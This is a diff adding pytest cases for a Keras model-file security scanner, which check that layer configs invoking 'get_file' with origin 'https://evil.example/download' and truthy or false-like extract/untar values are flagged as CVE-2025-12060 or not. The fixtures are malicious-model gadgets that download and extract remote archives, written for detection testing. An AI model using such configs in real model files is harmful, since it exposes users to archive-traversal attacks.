@@ -7249,7 +7249,98 @@ class TestCVE20258747GetFileGadget:
         }
         result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
 
+        cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
+        assert cve_issues
+        assert "Truthy" in cve_issues[0].details["description"]
+        assert cve_issues[0].why is not None
+        assert "truthy" in cve_issues[0].why
+
+    @pytest.mark.parametrize(
+        "call_config",
+        [
+            {
+                "fn": "get_file",
+                "kwargs": {"origin": "https://evil.example/download", "extract": "false"},
+            },
+            {
+                "fn": "get_file",
+                "kwargs": {"origin": "https://evil.example/download", "untar": 1},
+            },
+            {"fn": "get_file", "args": ["payload", "https://evil.example/download", "false"]},
+            {
+                "fn": "get_file",
+                "args": [
+                    "payload",
+                    "https://evil.example/download",
+                    False,
+                    None,
+                    None,
+                    "datasets",
+                    "auto",
+                    1,
+                ],
+            },
+        ],
+    )
+    def test_get_file_truthy_extraction_argument_forms_detect_cve_2025_12060(
+        self,
+        tmp_path: Path,
+        call_config: dict[str, Any],
+    ) -> None:
+        """Truthy kwargs and positional values must match Keras extraction behavior."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {"layers": [{"class_name": "Dense", "name": "dense_1", "config": call_config}]},
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+
         assert [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
+
+    @pytest.mark.parametrize(
+        "call_config",
+        [
+            {"fn": "get_file", "origin": "https://evil.example/download", "extract": False},
+            {"fn": "get_file", "origin": "https://evil.example/download", "untar": 0},
+            {
+                "fn": "get_file",
+                "kwargs": {"origin": "https://evil.example/download", "extract": ""},
+            },
+            {
+                "fn": "get_file",
+                "kwargs": {"origin": "https://evil.example/download", "untar": None},
+            },
+            {"fn": "get_file", "args": ["payload", "https://evil.example/download", []]},
+            {
+                "fn": "get_file",
+                "args": [
+                    "payload",
+                    "https://evil.example/download",
+                    False,
+                    None,
+                    None,
+                    "datasets",
+                    "auto",
+                    {},
+                ],
+            },
+        ],
+    )
+    def test_get_file_false_like_extraction_argument_forms_no_cve_2025_12060(
+        self,
+        tmp_path: Path,
+        call_config: dict[str, Any],
+    ) -> None:
+        """False-like extraction values must not create archive-traversal false positives."""
+        scanner = KerasZipScanner()
+        config = {
+            "class_name": "Sequential",
+            "config": {"layers": [{"class_name": "Dense", "name": "dense_1", "config": call_config}]},
+        }
+        result = scanner.scan(self._make_keras_zip(json.dumps(config), tmp_path))
+
+        assert not [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-12060"]
+        assert [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2025-8747"]
 
     def test_get_file_url_valued_kwargs_metadata_is_not_origin(self, tmp_path: Path) -> None:
         """URL-looking kwargs outside origin/url must not be reported as the downloaded archive."""
